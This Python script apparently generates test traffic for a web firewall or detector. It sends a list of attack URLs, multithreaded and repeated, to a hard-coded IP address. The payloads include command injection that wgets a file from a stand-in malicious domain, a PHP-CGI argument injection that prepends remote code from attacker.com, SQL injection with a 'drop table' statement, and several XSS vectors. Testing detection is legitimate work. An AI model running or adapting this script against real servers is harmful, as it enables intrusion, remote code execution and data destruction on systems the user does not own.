import multithread

"""
<multithread.requestNode> parameter:
    self, url='/', src_ip='', agent='', para='', method='GET'

<multithread.threads_run> parameter:
    prefix, request_list=[], repeat_num=1, thread_num=10
"""


def generate_nodelist():
    # num=13
    url_list = ['/bot',
                '/rootkit.php',
                '/test.php?path=%3Bwget%20http://malicious-domain/hack.php',
                '/cgi-bin/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp://attacker.com/evilcode.txt',
                '/stacked?a = 1; drop table b;',
                '/embedded?a = 1 and (select * from b where 1=1)',
                '/condition?a = 1 or 1 = 1',
                '/arithmetic?a = 1*1*1*1',
                '/sqlfunction?a = MOD(x,y)',
                '/tag?a=<input onfocus=write(1) autofocus>',
                '/attribute?id=1 onload="alert(0)"',
                '/css?a="style=-moz-binding:url(http://h4k.in/mozxss.xml#xss); a="',
                '/jsfunction?a=function test(){A=alert;A(1)}']

    nodelist = []
    for url in url_list:
        nodelist.append(multithread.requestNode(url))
    return nodelist


if __name__ == "__main__":
    prefix = 'https://52.78.82.9:8080'
    request_list = generate_nodelist()
    multithread.threads_run(prefix, request_list, 20, 10)
